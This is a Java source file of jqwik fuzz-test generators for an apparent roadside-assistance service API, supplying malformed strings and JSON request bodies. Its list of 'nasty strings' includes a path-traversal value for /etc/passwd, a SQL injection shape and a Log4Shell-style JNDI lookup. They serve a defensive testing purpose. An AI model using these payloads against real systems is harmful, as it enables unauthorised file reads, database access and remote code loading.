package com.autofik.sos.fuzz;

import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;

/** Shared constants and generators for the fuzz tests in this package. */
final class Fuzz {

  private Fuzz() {}

  /**
   * Pinned so a PR build is deterministic: it is red only for a reason in that PR. The same seed
   * with more tries is a strict superset (the first N inputs are identical), so the nightly job
   * just raises -Djqwik.tries.default=20000 to go deeper. jqwik has no switch to randomize a pinned
   * seed from config; to explore fresh sequences, change this constant for a one-off local run.
   */
  static final String SEED = "20261002";

  /** Strings that tend to break parsers: empty, huge, Unicode, control chars, injection shapes. */
  static Arbitrary<String> nastyStrings() {
    return Arbitraries.oneOf(
        Arbitraries.strings().ofMaxLength(300),
        Arbitraries.strings().all().ofMaxLength(60),
        Arbitraries.of(
            "",
            " ",
            "null",
            "undefined",
            "\u0000",
            "\n",
            "../../etc/passwd",
            "' OR 1=1 --",
            "${jndi:ldap://x/a}",
            "😀",
            "0".repeat(10_000),
            "{".repeat(5_000),
            "[".repeat(5_000)));
  }

  /** Raw JSON bodies, valid-looking and not, for endpoints that take a request body. */
  static Arbitrary<String> jsonBodies() {
    return Arbitraries.oneOf(
        nastyStrings(),
        Arbitraries.of(
            "{}",
            "[]",
            "null",
            "\"\"",
            "0",
            "{\"latitude\":1e999,\"longitude\":-1e999}",
            "{\"latitude\":\"x\",\"longitude\":null}",
            "{\"vehicleId\":\"not-a-uuid\"}",
            "{\"vehicleId\":1}",
            "{\"broadcastRadiusKm\":2147483648}",
            "{\"broadcastRadiusKm\":-1}",
            "{\"serviceGroupId\":\"a\",\"problemType\":{}}",
            "{" + "\"a\":".repeat(3_000) + "1}"));
  }
}
